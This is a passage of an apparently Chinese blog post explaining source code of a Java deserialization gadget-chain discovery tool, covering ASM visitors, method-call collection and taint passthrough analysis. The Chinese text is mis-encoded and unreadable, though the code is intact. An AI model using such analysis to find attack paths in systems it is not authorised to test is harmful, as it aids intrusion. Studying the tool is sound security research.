class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,    // è®¿é—®å­—æ®µ</span></span></span><br><span class="line"><span class="function"><span class="params">                               String signature, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123; <span class="comment">// è·³è¿‡é™æ€æˆå‘˜</span></span><br><span class="line">        Type type = Type.getType(desc); <span class="comment">// ç±»å‹</span></span><br><span class="line">        String typeName;</span><br><span class="line">        <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;    <span class="comment">// å¯¹è±¡æˆ–æ•°ç»„</span></span><br><span class="line">            typeName = type.getInternalName();  <span class="comment">// å†…éƒ¨åç§°</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            typeName = type.getDescriptor();    <span class="comment">// æè¿°ç¬¦</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è®°å½•å­—æ®µä¿¡æ¯ï¼Œä¿å­˜åˆ° members</span></span><br><span class="line">        members.add(<span class="keyword">new</span> ClassReference.Member(name, access, <span class="keyword">new</span> ClassReference.Handle(typeName)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> æ–¹æ³•ç”¨äºè®°å½•æ–¹æ³•ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ‰€å±ç±»åã€æ–¹æ³•åã€æè¿°ç¬¦ã€æ˜¯å¦ä¸ºé™æ€æ–¹æ³•ï¼ŒåŒæ ·æ ¹æ®è®¿é—®æ ‡å¿—åˆ¤æ–­æ˜¯å¦ä¸ºé™æ€æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions)</span> </span>&#123; <span class="comment">// è®¿é—®æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">boolean</span> isStatic = (access &amp; Opcodes.ACC_STATIC) != <span class="number">0</span>;  <span class="comment">// æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•æ–¹æ³•ä¿¡æ¯ï¼Œä¿å­˜åˆ° discoveredMethods</span></span><br><span class="line">    discoveredMethods.add(<span class="keyword">new</span> MethodReference(</span><br><span class="line">            classHandle,    <span class="comment">// æ‰€å±ç±»</span></span><br><span class="line">            name,</span><br><span class="line">            desc,</span><br><span class="line">            isStatic));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> æ–¹æ³•åœ¨ç±»è®¿é—®ç»“æŸæ—¶è°ƒç”¨ï¼Œï¼ˆå³ <code>ClassReader.accept</code> è°ƒç”¨çš„æœ€åä¸€ä¸ªè®¿é—®è€…æ–¹æ³•ï¼‰ï¼Œæ­¤æ—¶ç±»çš„å­—æ®µä¿¡æ¯å·²ç»è®°å½•å®Œæ¯•ï¼Œå¯ä»¥è®°å½•ä¸‹å®Œæ•´çš„ç±»ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€çˆ¶ç±»åã€æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ã€å­—æ®µä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;    <span class="comment">// ç±»è®¿é—®ç»“æŸï¼ˆè°ƒç”¨çš„æœ€åä¸€ä¸ªæ–¹æ³•ï¼‰</span></span><br><span class="line">    ClassReference classReference = <span class="keyword">new</span> ClassReference(</span><br><span class="line">            name,</span><br><span class="line">            superName,</span><br><span class="line">            interfaces,</span><br><span class="line">            isInterface,</span><br><span class="line">            members.toArray(<span class="keyword">new</span> ClassReference.Member[members.size()])); <span class="comment">// æŠŠæ‰€æœ‰æ‰¾åˆ°çš„å­—æ®µå°è£…</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•ç±»ä¿¡æ¯ï¼Œä¿å­˜åˆ° discoveredClasses</span></span><br><span class="line">    discoveredClasses.add(classReference);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å­˜å‚¨æ”¶é›†åˆ°çš„ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯ï¼ŒåŒæ—¶è°ƒç”¨ <code>InheritanceDeriver.derive</code> è·å–ç»§æ‰¿ä¿¡æ¯å¹¶ä¿å­˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨æ•°æ®</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// classes.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">    <span class="comment">// ç±»å çˆ¶ç±»å æ¥å£A,æ¥å£B,æ¥å£C æ˜¯å¦ä¸ºæ¥å£ å­—æ®µ1!å­—æ®µ1æè¿°ç¬¦!å­—æ®µ1ç±»å‹!å­—æ®µ2!å­—æ®µ2æè¿°ç¬¦!å­—æ®µ2ç±»å‹</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> ClassReference.Factory(), discoveredClasses);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// methods.dat æ•°æ®æ ¼å¼ï¼š</span></span><br><span class="line">    <span class="comment">// ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> MethodReference.Factory(), discoveredMethods);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å½¢æˆ ç±»å(ClassReference.Handle)-&gt;ç±»(ClassReference) çš„æ˜ å°„å…³ç³»</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">        classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯¹ä¸Šé¢çš„ç±»ä¿¡æ¯è¿›è¡Œé€’å½’æ•´åˆï¼Œå¾—åˆ° `å­ç±»-&gt;çˆ¶ç±»é›†åˆ` çš„ç»§æ‰¿ä¿¡æ¯ï¼Œä¿å­˜åˆ° inheritanceMap.dat</span></span><br><span class="line">    InheritanceDeriver.derive(classMap).save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-PassthroughDiscovery"><a href="#5-PassthroughDiscovery" class="headerlink" title="5. PassthroughDiscovery"></a>5. PassthroughDiscovery</h2><p><code>discover</code> æ–¹æ³•ä¸»è¦æ‰§è¡Œäº†ä¸‰ä¸ªæ­¥éª¤ï¼šâ‘  æœç´¢æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼Œå³æ¯ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†å“ªäº›æ–¹æ³•ï¼›â‘¡ å°†è°ƒç”¨ä¿¡æ¯è¿›è¡Œé€†æ‹“æ‰‘æ’åºï¼Œä¸ºäº†ä¾¿äºåç»­åˆ†æï¼›â‘¢ åˆ†ææ¯ä¸ªæ–¹æ³•çš„å‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿä¼ é€’æ±¡æŸ“ï¼Œå³æ–¹æ³•çš„è¿”å›ç»“æœæ˜¯å¦å¯ä»¥è¢«å…¶å‚æ•°å½±å“ã€‚</p><p>ä¾‹å¦‚ä»¥ä¸‹ä¸¤ä¸ªæ–¹æ³•ä¸­ï¼Œfoo æ–¹æ³•çš„è¿”å›ç»“æœå¯ä»¥è¢«å‚æ•°æ§åˆ¶ï¼Œè€Œ bar æ–¹æ³•çš„è¿”å›ç»“æœæ— æ³•è¢«æ§åˆ¶ã€‚å› æ­¤å¦‚æœæ±¡ç‚¹ï¼ˆæ”»å‡»è€…çš„è¾“å…¥æ•°æ®ï¼‰èµ°åˆ° bar æ–¹æ³•å°±ä¸èƒ½å†ç»§ç»­ä¸‹å»äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">foo</span><span class="params">(String v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">bar</span><span class="params">(String v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•çš„å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼šæ–¹æ³•-&gt;è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodCalls = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">// æ•°æ®æµä¿¡æ¯ï¼šæ–¹æ³•-&gt;ä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¾—åˆ°æ¯ä¸ªæ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ï¼ˆç´¢å¼•ï¼‰é›†åˆ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> config                  é…ç½®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">    <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">    <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯ï¼ˆinheritanceMapï¼šå­ç±»-&gt;çˆ¶ç±»é›†åˆï¼ŒsubClassMapï¼šçˆ¶ç±»-&gt;å­ç±»é›†åˆï¼‰</span></span><br><span class="line">    InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æœç´¢æ–¹æ³•çš„è°ƒç”¨å…³ç³»ï¼ˆmethodCallsï¼‰å¹¶å¾—åˆ° `ç±»å-&gt;ç±»èµ„æº` æ˜ å°„é›†åˆ</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¯¹æ–¹æ³•çš„è°ƒç”¨å…³ç³»è¿›è¡Œé€†æ‹“æ‰‘æ’åº</span></span><br><span class="line">    List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ†ææ¯ä¸ªæ–¹æ³•èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">    <span class="comment">// classResourceByName  ç±»èµ„æºé›†åˆ</span></span><br><span class="line">    <span class="comment">// classMap             ç±»ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">// inheritanceMap       ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">    <span class="comment">// sortedMethods        æ–¹æ³•é›†åˆï¼ˆç»é€†æ‹“æ‰‘æ’åºï¼‰</span></span><br><span class="line">    <span class="comment">// SerializableDecider  åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">            config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discoverMethodCalls</code> æ–¹æ³•åˆ©ç”¨ asm çš„è®¿é—®è€…è®°å½•æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆä¿¡æ¯ï¼ŒåŒæ—¶å­˜å‚¨ç±»åå’Œç±»èµ„æºçš„æ˜ å°„å…³ç³»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœç´¢æ–¹æ³•è°ƒç”¨ä¿¡æ¯ï¼šæ–¹æ³•-&gt;è¢«è°ƒç”¨æ–¹æ³•é›†åˆ</span></span><br><span class="line"><span class="comment"> * å­˜å‚¨ç±»èµ„æºæ˜ å°„ä¿¡æ¯ï¼šç±»å-&gt;ç±»èµ„æº</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator ç±»æšä¸¾å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ç±»å-&gt;ç±»èµ„æº</span></span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// éå†æ‰€æœ‰çš„ç±»</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// åˆ›å»º ClassReaderï¼Œåç»­è°ƒç”¨ accept æ–¹æ³•è§£æç±»æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ç»§æ‰¿ asm çš„ ClassVisitor(MethodVisitor) å®ç°å¯¹ç±»æ–‡ä»¶çš„è§‚å¯Ÿ</span></span><br><span class="line">                MethodCallDiscoveryClassVisitor visitor = <span class="keyword">new</span> MethodCallDiscoveryClassVisitor(Opcodes.ASM6);</span><br><span class="line">                <span class="comment">// é‡å†™æ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼ˆæ²¡æœ‰é‡å†™çš„è°ƒç”¨é»˜è®¤æ–¹æ³•ï¼‰ï¼švisit -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                <span class="comment">// å­˜å‚¨ `ç±»å(String)-&gt;ç±»èµ„æº(ClassResource)` çš„æ˜ å°„å…³ç³»</span></span><br><span class="line">                classResourcesByName.put(visitor.getName(), classResource);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classResourcesByName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryClassVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ ClassVisitorï¼Œé‡å†™äº†ä¸‰ä¸ªè®¿é—®è€…æ–¹æ³•ï¼Œå¹¶å®ç°äº†ä¸€ä¸ªè¿”å›ç±»åçš„æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCallDiscoveryClassVisitor</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodCallDiscoveryClassVisitor</span><span class="params">(<span class="keyword">int</span> api)</span> </span>&#123;   <span class="comment">// è®¿é—®è€…å®ç°çš„ ASM API ç‰ˆæœ¬ï¼Œå¿…é¡»æ˜¯ Opcodes.</span></span><br><span class="line">        <span class="keyword">super</span>(api);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name = <span class="keyword">null</span>; <span class="comment">// ç±»å</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›ç±»å</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> æ–¹æ³•åªè®°å½•äº†å½“å‰è®¿é—®çš„ç±»çš„åç§°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">                  String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.name != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;ClassVisitor already visited a class!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è®°å½•ç±»å</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethod</code> æ–¹æ³•ä½¿ç”¨ <code>MethodCallDiscoveryMethodVisitor</code> ç±»ï¼ˆç»§æ‰¿äº† asm ä¸­çš„ MethodVisitorï¼‰è§‚å¯Ÿæ–¹æ³•ï¼Œå¹¶è°ƒç”¨ <code>JSRInlinerAdapter</code> ç®€åŒ–ä»£ç åˆ†æã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">    MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    <span class="comment">// åˆ›å»º MethodCallDiscoveryMethodVisitor è§‚å¯Ÿæ–¹æ³•</span></span><br><span class="line">    MethodCallDiscoveryMethodVisitor modelGeneratorMethodVisitor = <span class="keyword">new</span> MethodCallDiscoveryMethodVisitor(</span><br><span class="line">            api, mv, <span class="keyword">this</span>.name, name, desc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ç®€åŒ–ä»£ç åˆ†æï¼Œåˆ é™¤ JSR æŒ‡ä»¤å¹¶å†…è”å¼•ç”¨çš„å­ä¾‹ç¨‹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitEnd</code> æ–¹æ³•ç›´æ¥è°ƒç”¨çš„çˆ¶ç±»æ–¹æ³•ï¼Œåœ¨è¿™é‡Œä¸é‡å†™åº”è¯¥å¯ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.visitEnd();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodCallDiscoveryMethodVisitor</code> ç±»ç»§æ‰¿äº† asm ä¸­çš„ MethodVisitorï¼Œåªé‡å†™äº† <code>visitMethodInsn</code> æ–¹æ³•ï¼Œç”¨äºè®¿é—®è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ï¼›åˆ©ç”¨ <code>calledMethods</code> è®°å½•å½“å‰è®¿é—®çš„æ–¹æ³•è°ƒç”¨çš„æ‰€æœ‰æ–¹æ³•ï¼Œç„¶åè®°å½•åˆ° <code>methodCalls</code> å˜é‡ä¸­ï¼Œè¿™é‡Œä¸æ³¨æ„ç‚¹å°±çœ‹æ··äº†ğŸ˜µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCallDiscoveryMethodVisitor</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³•è°ƒç”¨çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;MethodReference.Handle&gt; calledMethods;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ–¹æ³•è®¿é—®è€…æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> api   ASM API ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mv    MethodVisitor å®ä¾‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> owner æ–¹æ³•æ‰€å±ç±»çš„ç±»å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name  æ–¹æ³•çš„åç§°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc  æ–¹æ³•çš„æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> 